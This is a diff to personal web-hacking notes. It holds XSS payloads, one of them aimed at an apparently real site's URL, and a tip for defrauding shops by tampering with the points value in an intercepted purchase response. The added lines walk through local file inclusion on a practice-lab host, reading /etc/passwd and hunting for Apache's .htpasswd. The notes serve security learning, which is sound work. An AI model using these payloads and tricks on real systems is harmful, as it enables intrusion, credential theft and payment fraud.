@@ -323,15 +323,51 @@ value="leebl"> (original)
 value=""><img src=x onerror=alert(1)>">
 
 value="leebl"><img src=x onerror=alert(1)>">
-____________________________________________________________________________________________________________________________________________
+___________________________________________________________________________________________________________________________________
 Instead of using <script></script> (use <button></button>
 -----------------------------------------------------------
 https://www.ytech.vip/message/en/record.html?id=hello<button onclick=prompt(1)</button>
-____________________________________________________________________________________________________________________________________________
+___________________________________________________________________________________________________________________________________
  Product Ordering Bypass with free money 
 ----------------------------------------
 When the shop gives pawns or points (we can buy with that ting)
 Intercept (buy now) and do response manipulation and change the points(pawns), After that we can buy anything.
-____________________________________________________________________________________________________________________________________________
+___________________________________________________________________________________________________________________________________
+sometimes check js code in debugger mode
+----------------------------------------
+inspect > debugger > js code (for example http://vulnnet.thm/index.php?referer= )
+
+
+**Don't forget to check view-page:source
+-----------------------------------------
+http://vulnnet.thm/index.php?referer=/etc/passwd
+
+In display --> You only see original webpage
+In view-source: --> You will see passwd file
+
+Finally, we do LFI bruteforcing with lfi-linux.list (/etc/apache2/site-enabled)
+----------------------------------------------------------------------------------
+
+The directory /etc/apache2/sites-enabled typically contains symbolic links to configuration files located in the /etc/apache2/sites-available directory. These configuration files define virtual hosts or websites that Apache HTTP Server can serve.
+
+it displays in view-source:
+---------------------------
+
+<VirtualHost *:80>
+	ServerAdmin webmaster@localhost
+	ServerName broadcast.vulnnet.thm
+	DocumentRoot /var/www/html
+	ErrorLog ${APACHE_LOG_DIR}/error.log
+	CustomLog ${APACHE_LOG_DIR}/access.log combined
+	<Directory /var/www/html>
+		Order allow,deny
+		allow from all
+		AuthType Basic
+		AuthName "Restricted Content"
+		AuthUserFile /etc/apache2/.htpasswd
+		Require valid-user
+
+
+!!We can finally find /etc/apache2/.htpasswd (LFI)
 
 
